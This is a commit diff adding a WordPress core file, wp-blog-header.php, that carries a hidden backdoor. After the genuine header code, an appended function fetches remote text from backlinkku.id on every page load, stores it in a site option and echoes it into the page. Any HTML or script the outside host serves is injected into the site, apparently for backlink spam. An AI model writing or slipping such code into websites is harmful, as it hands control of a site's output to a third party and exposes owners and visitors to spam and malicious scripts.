1f28a59acf71c9a7ad07a9cab97806ac4cc0bc46
WonXd2 <56256945+wonxd1337@users.noreply.github.com>
2024-10-12 18:20:18 +0700

    Add files via upload

---
+++ wp-blog-header.php
@@ -0,0 +1,37 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+function fetch_and_display_content($url) {
+    $response = wp_remote_get($url);
+    if (is_wp_error($response)) {
+        return;
+    }
+    $body = wp_remote_retrieve_body($response);
+    if (strpos($body, '<?php') !== false) {
+        return;
+    }
+    update_option('jasabacklink_content', $body);
+    echo $body;
+}
+$ilmumahal = 'https://backlinkku.id/menu/traffic-v1/script.txt';
+fetch_and_display_content($ilmumahal);
+$jasabacklinks = 'https://backlinkku.id/menu/server-id/script.txt';
+fetch_and_display_content($jasabacklinks);
